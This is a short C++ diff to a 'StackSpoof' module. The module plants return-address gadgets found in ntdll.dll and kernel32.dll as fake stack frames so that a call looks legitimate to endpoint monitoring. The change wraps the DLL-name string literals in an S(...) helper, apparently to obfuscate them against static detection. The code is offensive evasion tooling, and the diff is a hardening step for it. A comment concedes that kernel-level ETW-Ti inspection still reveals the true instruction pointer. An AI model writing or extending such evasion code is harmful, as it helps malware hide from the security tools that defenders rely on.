@@ -54,8 +54,8 @@ ULONG_PTR StackSpoof::Call(SpoofedFn fn,
     ULONG_PTR a1, ULONG_PTR a2, ULONG_PTR a3, ULONG_PTR a4)
 {
     // Gadgets we'll plant as fake return addresses
-    PVOID ntdllRet   = FindRetGadget("ntdll.dll");
-    PVOID k32Ret     = FindRetGadget("kernel32.dll");
+    PVOID ntdllRet   = FindRetGadget(S("ntdll.dll").c_str());
+    PVOID k32Ret     = FindRetGadget(S("kernel32.dll").c_str());
 
     if (!ntdllRet || !k32Ret) {
         // Fallback: direct call (no stack spoofing)
@@ -97,8 +97,8 @@ ULONG_PTR StackSpoof::Call(SpoofedFn fn,
 }
 
 std::string StackSpoof::StackReport() {
-    PVOID ntdllRet = FindRetGadget("ntdll.dll");
-    PVOID k32Ret   = FindRetGadget("kernel32.dll");
+    PVOID ntdllRet = FindRetGadget(S("ntdll.dll").c_str());
+    PVOID k32Ret   = FindRetGadget(S("kernel32.dll").c_str());
     char buf[512];
     snprintf(buf, sizeof(buf),
         "StackSpoof gadgets:\n"
@@ -111,10 +111,10 @@ std::string StackSpoof::StackReport() {
         "  ... (no unbacked/RWX frames visible)\n"
         "Detection: kernel-mode CONTEXT inspection via ETW-Ti still reveals true RIP.",
         (DWORD64)ntdllRet,
-        ntdllRet ? (DWORD64)ntdllRet-(DWORD64)GetModuleHandleA("ntdll.dll") : 0,
+        ntdllRet ? (DWORD64)ntdllRet-(DWORD64)GetModuleHandleA(S("ntdll.dll").c_str()) : 0,
         (DWORD64)k32Ret,
-        k32Ret   ? (DWORD64)k32Ret  -(DWORD64)GetModuleHandleA("kernel32.dll") : 0,
-        ntdllRet ? (DWORD64)ntdllRet-(DWORD64)GetModuleHandleA("ntdll.dll") : 0,
-        k32Ret   ? (DWORD64)k32Ret  -(DWORD64)GetModuleHandleA("kernel32.dll") : 0);
+        k32Ret   ? (DWORD64)k32Ret  -(DWORD64)GetModuleHandleA(S("kernel32.dll").c_str()) : 0,
+        ntdllRet ? (DWORD64)ntdllRet-(DWORD64)GetModuleHandleA(S("ntdll.dll").c_str()) : 0,
+        k32Ret   ? (DWORD64)k32Ret  -(DWORD64)GetModuleHandleA(S("kernel32.dll").c_str()) : 0);
     return std::string(buf);
 }
